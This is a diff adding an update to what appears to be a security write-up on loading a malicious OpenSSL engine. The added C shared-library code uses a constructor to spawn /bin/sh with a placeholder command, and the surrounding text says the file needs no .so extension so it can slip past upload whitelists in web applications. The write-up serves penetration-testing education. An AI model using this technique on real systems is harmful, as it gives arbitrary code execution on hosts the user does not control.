@@ -46,6 +46,17 @@ IMPLEMENT_DYNAMIC_CHECK_FN()
 ```
 This file is mostly sourced from [this OpenSSL blog](https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/).
 
+**Update:** I submitted [a PR to GTFOBins and a maintainer replied with a much simpler engine file](https://github.com/GTFOBins/GTFOBins.github.io/pull/125):
+
+```
+#include <unistd.h>
+
+__attribute__((constructor))
+static void init() {
+    execl("/bin/sh", "sh", "-c","echo 'arbitrary code'");
+}
+```
+
 
 Compile it using the following gcc command, which will create the `engine.so` shared library. The engine file does not need to end in .so. This is very convenient as if you have a a web application that only allows whitelisted extensions for files written to disk you can get an engine file on there. 
 
